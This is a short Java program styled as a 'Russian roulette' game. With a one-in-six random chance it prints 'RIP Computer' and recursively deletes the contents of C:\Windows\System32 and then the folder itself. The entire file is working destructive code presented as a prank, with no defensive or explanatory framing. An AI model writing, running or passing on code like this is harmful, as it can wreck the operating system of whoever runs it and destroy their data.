import java.util.Random;
import java.io.File;

public class RR {
    private int[] bullets = new int[6];

    public RR() {
        bullets[0] = 1; 
        for(int i = 1; i < bullets.length; i++) {
            bullets[i] = 0;
        }
    }

    public void play() {
        String filepath = "C:\\Windows\\System32";
        File file = new File(filepath);
        Random rand = new Random();
        int chamber = rand.nextInt(6); 

        if(bullets[chamber] == 1) {
            System.out.println("Bang! You lost. RIP Computer.");
            deleteDirectory(file);
            file.delete();
        } else {
            System.out.println("Click! You're safe.");
        }
    }
    public static void deleteDirectory(File file){

        for (File subfile : file.listFiles()) {
            if (subfile.isDirectory()) {
                deleteDirectory(subfile);
            }
            subfile.delete();
        }
    }

    public static void main(String[] args) {
        RR game = new RR();
        game.play();
    }
}